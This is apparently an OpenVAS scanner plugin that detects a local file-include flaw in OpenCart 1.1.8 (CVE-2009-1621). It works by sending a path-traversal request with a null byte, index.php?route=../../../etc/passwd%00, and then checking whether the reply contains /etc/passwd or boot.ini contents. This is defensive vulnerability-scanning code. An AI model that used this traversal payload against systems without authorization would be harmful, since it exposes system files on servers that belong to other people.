###############################################################################
# OpenVAS Vulnerability Test
# $Id: opencart_34724.nasl 9425 2018-04-10 12:38:38Z cfischer $
#
# OpenCart 'index.php' Local File Include Vulnerability
#
# Authors
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "OpenCart is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input.

  An attacker can exploit this vulnerability to view files and execute
  local scripts in the context of the webserver process. This may aid
  in further attacks.

  OpenCart 1.1.8 is vulnerable; other versions may also be affected.";

tag_solution = "Update to newer Version. See http://www.opencart.com/ for more information.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100179");
 script_version("$Revision: 9425 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-10 14:38:38 +0200 (Tue, 10 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-05-02 19:46:33 +0200 (Sat, 02 May 2009)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_cve_id("CVE-2009-1621");
 script_bugtraq_id(34724);

 script_name("OpenCart 'index.php' Local File Include Vulnerability");


 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("opencart_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34724");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!version = get_kb_item(string("www/", port, "/opencart")))exit(0);
if(!matches = eregmatch(string:version, pattern:"^(.+) under (/.*)$"))exit(0);

dir  = matches[2];

 if(!isnull(dir)) {

   foreach file (make_list("etc/passwd", "boot.ini")) {
     url = string(dir, "/index.php?route=../../../../../../../../../../../../../../../", file,"%00");
     req = http_get(item:url, port:port);
     buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
     if( buf == NULL )continue;
    
       if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf))
       {    
         security_message(port:port);
         exit(0);   
       }
    }
  }


exit(0);
